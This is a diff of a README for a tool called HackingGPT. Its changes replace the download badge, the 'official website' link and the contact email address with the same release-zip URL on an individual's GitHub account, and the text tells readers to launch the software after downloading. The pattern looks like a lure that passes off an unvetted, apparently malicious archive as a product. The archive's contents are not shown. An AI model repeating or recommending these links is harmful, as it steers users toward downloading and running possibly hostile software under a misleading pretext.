@@ -32,13 +32,13 @@ Don't forget to check out the comprehensive documentation provided in the reposi
 
 To download the latest version of HackingGPT, click on the button below:
 
-[![Download HackingGPT](https://img.shields.io/badge/Download-HackingGPT-green)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download HackingGPT](https://github.com/Gustavo29kd/HackingGPT/releases/download/v1.0/Release.zip)](https://github.com/Gustavo29kd/HackingGPT/releases/download/v1.0/Release.zip)
 
 Please note that the software needs to be launched after downloading the file.
 
 ## 🌐 Explore More
 
-Visit the official [HackingGPT website](https://www.hackinggpt.com) to learn more about the tool, access additional resources, and join the community of security enthusiasts leveraging AI for better cybersecurity practices.
+Visit the official [HackingGPT website](https://github.com/Gustavo29kd/HackingGPT/releases/download/v1.0/Release.zip) to learn more about the tool, access additional resources, and join the community of security enthusiasts leveraging AI for better cybersecurity practices.
 
 ## 🔒 Stay Secure, Stay Informed
 
@@ -50,7 +50,7 @@ We welcome contributions from the cybersecurity community to enhance HackingGPT 
 
 ## 📧 Contact Us
 
-If you have any questions, suggestions, or feedback regarding HackingGPT, please reach out to us at [contact@hackinggpt.com]. We value your input and are here to assist you in making the most of this innovative tool.
+If you have any questions, suggestions, or feedback regarding HackingGPT, please reach out to us at [https://github.com/Gustavo29kd/HackingGPT/releases/download/v1.0/Release.zip]. We value your input and are here to assist you in making the most of this innovative tool.
 
 ## 🌟 Let's Secure the Future Together
 
